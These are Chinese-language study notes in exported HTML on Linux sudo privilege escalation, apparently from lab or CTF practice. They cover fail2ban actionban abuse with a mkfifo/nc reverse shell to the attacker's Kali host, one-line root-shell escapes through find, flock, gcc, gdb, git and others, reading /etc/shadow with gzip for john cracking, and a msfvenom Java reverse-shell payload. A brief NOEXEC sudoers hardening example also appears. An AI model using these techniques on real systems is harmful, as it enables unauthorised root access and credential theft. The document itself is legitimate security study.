<h2 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130205320395.png?lastModify=1766751620" alt="image-20251130205320395"></p>
<p><code>fail2ban</code>功能：反复登录<code>ssh</code>超过几次&#x2F;规定时间段内超过几次，可能会被（暂时）ban掉    防御性功能</p>
<p><strong>查找</strong><code>fail2ban</code>的目录：<code>find / -name &quot;fail2ban*&quot; -type d 2&gt;/dev/null</code></p>
<p>**这里的 **<code>/etc/fail2ban</code>就是所在目录</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130205734242.png?lastModify=1766751620" alt="image-20251130205734242"></p>
<p>**接下来看他的action目录是否可写 **<code>find /etc -writable -type d 2&gt;/dev/null</code> (根据上面的结果，一定在etc目录下)</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130205913225.png?lastModify=1766751620" alt="image-20251130205913225"></p>
<p><strong>接下来就可以尝试写，被ban掉之后的行为</strong></p>
<p><strong>先看一下</strong><code>fail2ban</code>的配置文件，看<strong>次数和时间</strong>。这里说明 <strong>10s内输入5次错误ban 10s</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130210413293.png?lastModify=1766751620" alt="image-20251130210413293"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130210241590.png?lastModify=1766751620" alt="image-20251130210241590"></p>
<p><strong>再看ban的行为，在action目录里</strong></p>
<p><code>action.d</code> 中的 <code>.d</code>是Linux的<strong>脚本目录</strong>命名格式 ，里面有若干脚本，都是可以供<code>fail2ban</code>调用的</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130210600782.png?lastModify=1766751620" alt="image-20251130210600782"></p>
<p>**其中的 **<code>iptables-multiport.conf</code>决定着尝试次数短时间内出发了ban这个行为的时候具体怎么处置</p>
<p><strong>这个文件有这个功能是fail2ban的功能，以后遇到类似不了解的情况，可以去搜寻一下这个程序的行为</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130210750944.png?lastModify=1766751620" alt="image-20251130210750944"></p>
<p><strong>可以看到属主是root，root组，现在我们并不能修改这个文件</strong></p>
<p>**又因为当前目录 **<code>action.d</code>是可写的</p>
<p>**首先用 **<code>mv</code> 对这个文件进行备份，此时这个文件就不存在了</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130211315182.png?lastModify=1766751620" alt="image-20251130211315182"></p>
<p><strong>可以看到，备份的文件还是root属主，组</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130211431388.png?lastModify=1766751620" alt="image-20251130211431388"></p>
<p><strong>然后再将他</strong><code>cp</code>回来，他就变成普通用户属主，组</p>
<p><strong>这是Linux底层权限变动</strong></p>
<p><code>mv</code>是移动文件，并不创造新文件，只是挪了位置，所有权限参数不变</p>
<p><code>cp</code>是照着原文件创造新文件</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130211855327.png?lastModify=1766751620" alt="image-20251130211855327"></p>
<p><strong>可以看到，这里变成了两个文件，原本有的<code>.conf</code>已经变成新文件了，而原来的成了<code>.bak</code></strong></p>
<p><strong>这样我们就能对</strong><code>iptables-multiport.conf</code>这个新的，普通用户属主，组的文件进行修改了</p>
<p><strong>这里的</strong><code>actionban</code>就是触发了ban后执行的命令</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130212319715.png?lastModify=1766751620" alt="image-20251130212319715"></p>
<p><strong>编辑成我们提权的逻辑，可以用各种反弹shell</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6544" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">action <span class="cm-operator">=</span> <span class="cm-builtin">rm</span> /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash <span class="cm-attribute">-i</span> <span class="cm-number">2</span>>&1 | <span class="cm-builtin">nc</span> kaliIP port >/tmp/f</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130212441462.png?lastModify=1766751620" alt="image-20251130212441462"></p>
<blockquote>
<h4 id="（1）rm-tmp-f"><a href="#（1）rm-tmp-f" class="headerlink" title="（1）rm /tmp/f"></a>（1）<code>rm /tmp/f</code></h4><p>**删除 **<code>/tmp</code> 目录下名为 <code>f</code> 的文件（若存在），避免后续创建管道时冲突。</p>
<h4 id="（2）mkfifo-tmp-f"><a href="#（2）mkfifo-tmp-f" class="headerlink" title="（2）mkfifo /tmp/f"></a>（2）<code>mkfifo /tmp/f</code></h4><p><strong>创建一个****命名管道</strong>（FIFO）文件 <code>/tmp/f</code>。</p>
<ul>
<li><strong>管道是一种特殊文件，用于进程间通信，写入管道的数据会被读取端获取，实现单向数据传输。</strong></li>
</ul>
<h4 id="（3）cat-tmp-f-bin-bash-i-2-1"><a href="#（3）cat-tmp-f-bin-bash-i-2-1" class="headerlink" title="（3）cat /tmp/f | /bin/bash -i 2&gt;&amp;1"></a>（3）<code>cat /tmp/f | /bin/bash -i 2&gt;&amp;1</code></h4><ul>
<li><code>cat /tmp/f</code>：读取管道 <code>/tmp/f</code> 中的数据（后续由 <code>nc</code> 写入的远程命令）。</li>
<li><code>| /bin/bash -i</code>：将读取到的数据作为输入传递给交互式 Bash（<code>-i</code> 表示交互式），执行远程命令。</li>
<li><code>2&gt;&amp;1</code>：将标准错误（<code>2</code>）重定向到标准输出（<code>1</code>），确保命令执行的错误信息也能被后续的 <code>nc</code> 发送回远程主机。</li>
</ul>
<h4 id="（4）-nc-kaliIP-port-tmp-f"><a href="#（4）-nc-kaliIP-port-tmp-f" class="headerlink" title="（4）| nc kaliIP port &gt;/tmp/f"></a>（4）<code>| nc kaliIP port &gt;/tmp/f</code></h4><ul>
<li><code>| nc kaliIP port</code>：将 Bash 执行命令后的输出（标准输出 + 标准错误）通过管道传递给 <code>nc</code>，由 <code>nc</code> 发送到远程主机的 <code>kaliIP:port</code>（攻击者的 Kali 机器 IP 和监听端口）。</li>
<li><code>&gt;/tmp/f</code>：将远程主机通过 <code>nc</code>发送过来的新命令写入管道<code>/tmp/f</code>，形成循环：<br>**远程命令 → **<code>nc</code> → 管道 <code>/tmp/f</code>→ <code>cat</code>→ Bash 执行 → 输出返回 <code>nc</code>→ 远程主机</li>
</ul>
<h3 id="3-整体功能"><a href="#3-整体功能" class="headerlink" title="3. 整体功能"></a>3. 整体功能</h3><p><strong>这是一个****反向 Shell</strong>的经典实现：</p>
<ul>
<li>**通过命名管道 **<code>/tmp/f</code> 建立 Bash 与 <code>nc</code> 之间的双向通信；</li>
<li>**攻击者在 Kali 机器上用 **<code>nc -lvp port</code> 监听端口，即可获取目标机器的交互式 Shell，执行任意命令。</li>
</ul>
</blockquote>
<p><strong>然后执行任务的重启，必须重启fail2ban之后才能让action的规则生效！</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130212919584.png?lastModify=1766751620" alt="image-20251130212919584"></p>
<p>**在kali中建立监听 **<code>sudo nc -lvnp 9595</code></p>
<p><strong>然后在kali中</strong><code>ssh</code>进行10s内5次的错误连接</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130213015085.png?lastModify=1766751620" alt="image-20251130213015085"></p>
<p><strong>可以看到，监听到了反弹的</strong><code>root shell</code></p>
<p><strong>文件底层权限，fail2ban的目录结构</strong></p>
<h2 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201183654760.png?lastModify=1766751620" alt="image-20251201183654760"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6593" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">find</span> . <span class="cm-attribute">-exec</span> /bin/bash \; <span class="cm-attribute">-quit</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>.</code></td>
<td><strong>起始路径</strong></td>
<td><strong>当前目录（可换成</strong><code>/</code>、<code>/etc</code>等，没用影响）</td>
</tr>
<tr>
<td><code>-exec</code></td>
<td><strong>find 动作</strong></td>
<td><strong>对每一个找到的文件执行后面给出的命令</strong></td>
</tr>
<tr>
<td><code>/bin/bash</code></td>
<td><strong>要执行的程序</strong></td>
<td><strong>这里直接写死 bash 路径</strong></td>
</tr>
<tr>
<td><code>\;</code></td>
<td><strong>-exec 结束符</strong></td>
<td><strong>必须转义的分号</strong>；告诉 find “命令到此结束”。 （未转义时分号会被 shell 先吃掉，当作命令分隔符，导致语法错误）</td>
</tr>
<tr>
<td><code>-quit</code></td>
<td><strong>find 动作</strong></td>
<td><strong>找到第一个结果后立即退出 find</strong>，防止无限循环或重复弹 shell</td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201183800660.png?lastModify=1766751620" alt="image-20251201183800660"></p>
<p><strong><code>NOEXEC</code> 就是 sudo 的“封印”：允许你跑这条程序，但禁止它再孵化任何新进程，彻底堵死“编辑器 -&gt; !bash”、“find -&gt; -exec”这类提权后门口。</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6624" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 精准到某条命令（推荐）</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">user <span class="cm-def">ALL</span><span class="cm-operator">=</span>(root) NOEXEC: /usr/bin/find, /usr/bin/nano</span></pre></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li>**写在 **<code>/etc/sudoers</code> 或 <code>/etc/sudoers.d/*</code></li>
</ul>
<table>
<thead>
<tr>
<th><strong>场景</strong></th>
<th><strong>没加 NOEXEC</strong></th>
<th><strong>加了 NOEXEC</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>sudo find . -exec /bin/bash \; -quit</code></td>
<td><strong>✅ 直接 root shell</strong></td>
<td><strong>❌</strong><code>bash: Permission denied</code></td>
</tr>
</tbody></table>
<h2 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201184847559.png?lastModify=1766751620" alt="image-20251201184847559"></p>
<p><code>flock</code>是Linux中管理文件锁定的实用程序，它可以用来协调多个进程对文件的访问，避免这些进程访问同一个资源出现问题</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6643" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> flock <span class="cm-attribute">-u</span> / /bin/bash</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201185337099.png?lastModify=1766751620" alt="image-20251201185337099"></p>
<p><code>-u</code>参数即<code>unlock</code>解锁</p>
<p><strong>解锁根目录下的文件，并允许一个程序来操作（肯定希望是</strong><code>/bin/bash</code>）</p>
<p><code>flock</code>解锁根目录下的所有文件，并允许它们被 <code>/bin/bash</code>操作</p>
<blockquote>
<p><strong>执行流程</strong></p>
<ol>
<li><code>flock -u /</code> 对根目录 <strong>做一次空解锁</strong>（没实际影响，但语法合法，无锁可解时也不报错）。</li>
<li>**解锁动作结束，flock 立即 **<strong>execve(“&#x2F;bin&#x2F;bash”, …)</strong> ——<strong>进程映像替换为 bash</strong>。</li>
<li>**因为整条命令是 **<strong>sudo 启动的</strong>，所以新的 bash 身份为 <strong>root</strong>。</li>
<li><strong>用户落在交互式 root shell，PID 不变。</strong></li>
</ol>
</blockquote>
<h2 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201185740449.png?lastModify=1766751620" alt="image-20251201185740449"></p>
<p><code>sudo ftp</code>启动<strong>交互式的命令行</strong></p>
<p><code>!</code>告诉ftp执行系统命令。 <code>/bin/bash</code>启动新的bash会话</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201185946475.png?lastModify=1766751620" alt="image-20251201185946475"></p>
<h2 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201190016516.png?lastModify=1766751620" alt="image-20251201190016516"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6670" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">gcc</span> <span class="cm-attribute">-wrapper</span> /bin/bash,-s .</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201190141399.png?lastModify=1766751620" alt="image-20251201190141399"></p>
<table>
<thead>
<tr>
<th><code>-wrapper /bin/bash,-s</code></th>
<th><strong>调用真正的 cc1 之前，先执行<code>/bin/bash -s</code></strong>，并把后续所有参数通过 stdin 传给它</th>
</tr>
</thead>
<tbody><tr>
<td><code>-s</code></td>
<td><strong>bash 的选项，****“从标准输入读取命令”</strong>（交互式或脚本都可）<strong>让 bash 变成“可管道”的交互壳</strong></td>
</tr>
<tr>
<td><code>.</code></td>
<td>**随便给的一个目录（**<strong>无实际源文件也能触发 wrapper</strong>；gcc 会报错，但 bash 已先运行）</td>
</tr>
</tbody></table>
<p><strong>执行流程</strong></p>
<ol>
<li>**sudo 启动 **<strong>root 身份的 gcc</strong>。</li>
<li>**gcc 解析到 **<code>-wrapper /bin/bash,-s</code> → <strong>fork + execve(“&#x2F;bin&#x2F;bash”, “-s”)</strong>。</li>
<li>**bash 以 **<strong>root 身份、交互模式</strong> 启动，等待 stdin 命令。</li>
<li>**此时屏幕出现 **<code>bash-5.1#</code> 提示符，<strong>原 gcc 编译流程被阻塞</strong>（可忽略报错）。</li>
<li>**攻击者已拿到 **<strong>root shell</strong>，<code>id</code> 显示 <code>uid=0</code>。</li>
</ol>
<p><strong>版本****GCC ≤ 8.x</strong> 才支持 <code>-wrapper</code>（新发行版默认禁用或删除该选项）</p>
<h2 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201190842644.png?lastModify=1766751620" alt="image-20251201190842644"></p>
<p>** **<strong>gdb</strong> &#x3D; <strong>GNU Debugger</strong> **Linux&#x2F;Unix 下事实上的 ****“万能调试器”**：可 <strong>断点、单步、反汇编、修内存、抓崩溃、调内核&#x2F;驱动&#x2F;嵌入式</strong>，也能当 <strong>二进制分析、漏洞利用、逆向工程</strong> 的瑞士军刀。 **	**<strong>源代码级别的调试器</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201191201975.png?lastModify=1766751620" alt="image-20251201191201975"></p>
<p><strong>要求</strong><code>gdb</code>什么都不执行，但是启动一个bash会话，然后退出<code>gdb</code></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6705" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> gdb <span class="cm-attribute">-nx</span> <span class="cm-attribute">-ex</span> <span class="cm-string">'!bash'</span> <span class="cm-attribute">-ex</span> quit</span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><code>-nx</code></th>
<th><strong>跳过系统级和用户级</strong><code>.gdbinit</code>配置文件，防止别名&#x2F;脚本干扰</th>
</tr>
</thead>
<tbody><tr>
<td><code>-ex &#39;!bash&#39;</code></td>
<td><strong>在 gdb 启动后立即执行 shell 命令<code>bash</code></strong>（感叹号<code>!</code>是 gdb 的“shell 转义”符 告诉他执行系统命令）</td>
</tr>
<tr>
<td><code>-ex quit</code></td>
<td>**命令执行完立刻退出 gdb，**<strong>把终端留给 bash</strong></td>
</tr>
</tbody></table>
<p><strong>实际流程</strong></p>
<ol>
<li>**sudo 让你拿到 **<strong>root 身份的 gdb 进程</strong>。</li>
<li>**gdb 启动 → 遇到 **<code>-ex &#39;!bash&#39;</code> → <strong>fork + execve(“&#x2F;bin&#x2F;bash”)</strong>。</li>
<li>**bash 以 **<strong>root 权限</strong> 跑在 <strong>当前终端</strong>，出现 <code>#</code> 提示符。</li>
<li>**gdb 随后 **<code>quit</code>，进程结束，<strong>bash 继续存活</strong>。</li>
</ol>
<h2 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h2><p>**sudo **</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6731" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">git</span> 子命令随意指定 <span class="cm-attribute">--help</span> </span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><strong>实际上跟menu的查看帮助是相似的，他调用的都是后台类似</strong><code>less</code>的机制，所以左下角可以输入指定命令</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201195503710.png?lastModify=1766751620" alt="image-20251201195503710"></p>
<p>**直接按 **<code>!/bin/bash</code> 执行系统命令新启bash</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201195537325.png?lastModify=1766751620" alt="image-20251201195537325"></p>
<p><strong>这种提权方式能代表一类的提权方式，都是调用了less的机制，方法。和less中提权是相似的</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201195739380.png?lastModify=1766751620" alt="image-20251201195739380"></p>
<h2 id="sudo-gzip-gunzip"><a href="#sudo-gzip-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201200502471.png?lastModify=1766751620" alt="image-20251201200502471"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6744" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> gzip <span class="cm-attribute">-f</span> /etc/shadow <span class="cm-attribute">-t</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201200556184.png?lastModify=1766751620" alt="image-20251201200556184"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201200819154.png?lastModify=1766751620" alt="image-20251201200819154"></p>
<table>
<thead>
<tr>
<th><code>-f</code></th>
<th><strong>强制</strong>（忽略后缀、忽略文件头错误、覆盖、权限）</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>-t</code></strong></td>
<td><strong>test 模式</strong>：gzip 会尝试解压文件，<strong>把整个文件读进内存</strong>做 CRC 校验，<strong>但不落盘</strong> <strong>即：尝试检查并读取文件</strong></td>
</tr>
</tbody></table>
<p><strong>下面就是将他保存在kali中，用</strong><code>john</code>破解，得到root密码，<code>su</code>切换root用户输入密码即可</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201201226799.png?lastModify=1766751620" alt="image-20251201201226799"></p>
<h2 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201201345172.png?lastModify=1766751620" alt="image-20251201201345172"></p>
<p><strong>是网络工具，主要用于分析和测试网络环境，生成各种形式的数据包</strong></p>
<p><strong>hping3 就是“命令行版 Wireshark + 发包机”：任何 TCP&#x2F;IP 字段都能随手改，扫描、绕过、洪水、传文件一条龙，是渗透测试和防火墙调优的万能瑞士军刀。</strong></p>
<p><strong>“面向命令行的 TCP&#x2F;IP 数据包组装&#x2F;发送&#x2F;嗅探工具”</strong></p>
<p><strong>手工发包、扫描、测防火墙、测 IDS、做拒绝服务、跳端口、传文件——全都能干</strong>。</p>
<p><strong>跟</strong><code>ftp</code>提权一样</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201201543307.png?lastModify=1766751620" alt="image-20251201201543307"></p>
<h2 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201201819353.png?lastModify=1766751620" alt="image-20251201201819353"></p>
<p><strong>命令行的网络流量监控工具，用于实时显示网络接口的带宽使用情况。类似于top，提供活动的网络连接和使用带宽的实时视图</strong></p>
<p>**iftop 就是 ****“网络版的 top”**——<strong>实时查看本机每条物理连接的带宽速率</strong>（IP ↔ IP，端口 ↔ 端口），<strong>不显示进程名</strong>，只显示 <strong>流量谁最大</strong>。</p>
<hr>
<p><strong>一句话定位</strong> <strong>“命令行实时流量监控工具，按连接排序，单位 KB&#x2F;s、MB&#x2F;s，适合快速定位谁占网。”</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201202205879.png?lastModify=1766751620" alt="image-20251201202205879"></p>
<p>**提权时还是 直接按 **<code>!</code>输入<code>/bin/bash</code> <img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201202322306.png?lastModify=1766751620" alt="image-20251201202322306"> 在左上角。<strong>都是一个套路</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201202428240.png?lastModify=1766751620" alt="image-20251201202428240"></p>
<h2 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201202525216.png?lastModify=1766751620" alt="image-20251201202525216"></p>
<p><strong>遇到这种大的语言执行程序，首先要想到的是****用这种语言本身</strong>进行提权</p>
<p>**kali中创建好反弹java shell的脚本，这里用的 **<code>msfvenom</code></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6787" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> msfvenom <span class="cm-attribute">-p</span> java/shell_reverse_tcp <span class="cm-def">LHOST</span><span class="cm-operator">=</span>kaliIP <span class="cm-def">LPORT</span><span class="cm-operator">=</span>任意4444 <span class="cm-attribute">-f</span> 指定文件类型jar <span class="cm-attribute">-o</span> 输出文件名称shell.jar</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201202821678.png?lastModify=1766751620" alt="image-20251201202821678"></p>
